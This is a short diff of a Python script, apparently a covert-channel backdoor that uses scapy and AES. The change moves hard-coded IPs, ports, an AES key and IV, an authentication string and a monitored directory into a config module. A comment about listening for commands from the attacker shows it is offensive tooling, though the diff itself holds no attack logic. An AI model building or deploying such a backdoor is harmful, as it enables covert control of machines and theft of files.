@@ -1,3 +1,4 @@
+#Dependancies
 from scapy.all import *
 from Crypto.Cipher import AES
 from multiprocessing import Process
@@ -6,18 +7,19 @@ import time
 import subprocess
 import binascii
 import pyinotify
+import parseConfig
 
 # Inputs
-localIP = "192.168.0.7"
-ttlKey = 164
-srcPort = 80
-dstPort = 53
-key = "0123456789abcdef"
-IV = "abcdefghijklmnop"
+localIP = parseConfig.localIP
+ttlKey = parseConfig.ttlKey
+srcPort = parseConfig.srcPort
+dstPort = parseConfig.dstPort
+key = parseConfig.key
+IV = parseConfig.IV
+authentication = parseConfig.authentication
+clientIP = parseConfig.clientIP
+monitorDir = parseConfig.monitorDir
 messages = []
-authentication = "TEST!"
-clientIP = "192.168.0.6"
-monitorDir = "./monitor"
 
 
 #1. Listen for commands from the attacker
